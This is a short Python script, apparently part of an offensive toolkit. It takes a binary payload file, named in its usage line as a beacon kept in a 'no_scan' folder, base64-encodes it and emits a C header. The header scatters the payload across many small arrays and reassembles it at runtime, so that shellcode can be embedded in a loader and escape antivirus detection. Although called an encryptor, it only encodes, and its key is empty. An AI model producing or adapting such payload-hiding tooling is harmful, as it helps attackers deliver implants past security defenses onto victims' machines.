"""
This code take a binary file as parameter un create the sc.h file that 
contains the binary file encoded in base64 written as C code.
Use it to store your payload in the .data section.

Usage: python encryptor.py C:\no_scan\beacon.bin
"""

from base64 import b64encode
import os
import sys
import string
import random

file = open(sys.argv[1], 'rb')
data = file.read()
file.close()

data += b'\x00\x00\x00\x00'
key = b''
ciphertext = b64encode(data)

file = open('./sc.h', 'w')
i = 1
k = 0
file.write('#define _CRT_SECURE_NO_WARNINGS\n#pragma once\n#include <string.h>\n\n')
for j in range(len(ciphertext)):
    elt = ciphertext[j]
    if(i%16 == 1):
        file.write('char sc_' + format(i//16) + '[16] = {')
        k += 1

    file.write('{}'.format(hex(elt)))

    if(i%16 == 0):
        file.write('};\n')

    elif j != len(ciphertext) - 1:
        file.write(',')
    i += 1

if(i%16 != 1):
    file.write('};\n')

file.write('\nchar sc[{}];\n'.format(len(ciphertext)))
file.write('int sc_length = {};\n'.format(len(ciphertext)))

file.write("void buildsc_0(){\n")
l = 1
m = 1
for i in range(k):
    file.write('\tmemcpy(&sc[{}], sc_{}, 16);\n'.format(i*16, i))
    if(l % 200 == 0):
        file.write("}\nvoid buildsc_" + format(m) + "(){\n")
        m += 1
    l += 1
file.write("}\n")

file.write("void buildsc(){\n")
for i in range(m):
    file.write("\tbuildsc_{}();\n".format(i))
file.write("}")

file.write('\nBYTE key[] = "{}";\n'.format(key.decode()))
file.close()